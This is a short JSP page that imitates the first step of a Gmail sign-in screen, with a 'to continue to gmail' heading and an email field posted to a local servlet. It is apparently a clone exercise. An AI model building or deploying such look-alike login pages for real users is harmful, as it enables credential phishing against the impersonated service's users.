<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
	<script type="text/javascript" src="login1.js">
	</script>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<link rel="stylesheet" type="text/css" href="Login.css">
<title>Insert title here</title>

</head>
<body>
	<div class="base" align="center">

		<form onsubmit="return checkvalid()" action="EmailServlet">
			<div id="form1">



				<img src="index.png" height=55 width=90 />
				<h2 class="text1">
					<b>Sign in</b>
				</h2>
				<h2 class="text3">
					<b>to continue to gmail</b>
				</h2>
				<input type="text" name="email" id="email" />
				
				<p class="text4">
					<a href="Login.html"> <b>More options</b>
					</a>
				</p>
				<input type="submit" id="button"
					value="Next" class="button" style="float: right" />
			</div>
		</form>
	</div>

	

</body>
</html>